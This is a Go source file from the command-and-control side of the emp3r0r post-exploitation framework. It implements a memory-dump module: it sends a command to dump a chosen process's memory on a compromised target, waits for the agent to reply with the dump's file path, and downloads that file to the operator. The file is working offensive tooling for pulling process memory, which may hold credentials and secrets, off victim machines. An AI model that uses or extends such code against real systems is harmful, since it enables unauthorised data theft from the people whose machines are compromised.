//go:build linux
// +build linux

package cc

import (
	"fmt"
	"strings"
	"time"

	"github.com/google/uuid"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
)

func moduleMemDump() {
	pidOpt, ok := CurrentModuleOptions["pid"]
	if !ok {
		CliPrintError("Option 'pid' not found")
		return
	}
	cmd := fmt.Sprintf("%s --pid %s", emp3r0r_def.C2CmdMemDump, pidOpt.Val)
	cmd_id := uuid.NewString()
	err := SendCmd(cmd, cmd_id, CurrentTarget)
	if err != nil {
		CliPrintError("SendCmd: %v", err)
		return
	}
	CliPrint("Please wait for agent's response...")

	var cmd_res string
	for i := 0; i < 100; i++ {
		// check if the command has finished
		res, ok := CmdResults[cmd_id] // check if the command has finished
		if ok {
			cmd_res = res
			CmdResultsMutex.Lock()
			delete(CmdResults, cmd_id)
			CmdResultsMutex.Unlock()
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
	path := cmd_res
	if path == "" || strings.HasPrefix(path, "Error") {
		CliPrintError("Failed to get memdump file path: invalid response")
		return
	}

	_, err = GetFile(path, CurrentTarget)
	if err != nil {
		CliPrintError("GetFile: %v", err)
		return
	}
}
